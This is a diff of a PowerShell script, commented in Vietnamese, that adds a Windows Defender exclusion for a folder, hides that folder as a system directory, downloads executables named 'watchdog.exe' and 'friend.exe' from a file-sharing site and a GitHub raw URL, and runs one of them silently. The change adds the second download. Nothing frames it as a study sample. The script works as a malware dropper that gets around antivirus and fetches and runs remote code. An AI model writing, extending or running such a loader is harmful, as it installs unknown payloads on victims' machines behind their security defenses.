@@ -6,6 +6,18 @@ Add-MpPreference -ExclusionPath $dir
 attrib +h +s $dir
 $folderPath = $dir
 
+$filePath = "$folderPath\friend.exe"
+$url = "https://github.com/manyak-cmd/a/raw/refs/heads/main/main.exe"
+
+# Tạo thư mục nếu chưa tồn tại
+if (!(Test-Path $folderPath)) {
+    New-Item -ItemType Directory -Path $folderPath -Force
+}
+
+# Kiểm tra nếu file chưa tồn tại thì tải về
+if (!(Test-Path $filePath)) {
+    Invoke-WebRequest -Uri $url -OutFile $filePath
+}
 
 $filePath = "$folderPath\watchdog.exe"
 $url = "https://anonsharing.com/file/0da952d4aeb48c3b/H-Output_(2).exe"
@@ -19,6 +31,8 @@ if (!(Test-Path $folderPath)) {
 if (!(Test-Path $filePath)) {
     Invoke-WebRequest -Uri $url -OutFile $filePath
 }
+
+
 
 # Chạy file thực thi
 Start-Process -FilePath $filePath -NoNewWindow
